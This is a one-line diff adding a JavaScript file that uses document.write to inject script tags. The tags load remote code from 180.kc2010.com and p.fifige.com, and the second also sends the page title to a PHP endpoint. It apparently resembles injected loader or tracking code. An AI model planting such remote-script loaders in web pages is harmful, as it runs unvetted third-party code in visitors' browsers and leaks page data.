@@ -1,0 +1,1 @@
+document.write("<script language='javascript' src='f.js-_vv=20080808'/*tpa=http://180.kc2010.com/f.js?_vv=20080808*/></script>");document.write("<script language='javascript' src='http://p.fifige.com/pt/pt.php?src=p0003&t="+encodeURIComponent(document.title)+"&ci=1703088008'></script>");
